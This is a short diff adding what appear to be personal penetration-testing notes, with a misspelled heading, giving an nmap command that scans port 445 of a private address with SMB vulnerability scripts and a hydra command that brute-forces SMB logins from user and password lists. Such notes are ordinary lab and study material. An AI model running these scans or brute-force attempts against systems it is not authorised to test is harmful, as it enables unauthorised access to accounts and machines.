@@ -1,0 +1,5 @@
+SMB SCAN LLOOKING FOR VULERBILTY 
+nmap --script smb-vuln* -p 445 192.168.1.101
+
+SMB login via Brute Force
+hydra -L user.txt -P pass.txt 192.168.1.101 smb
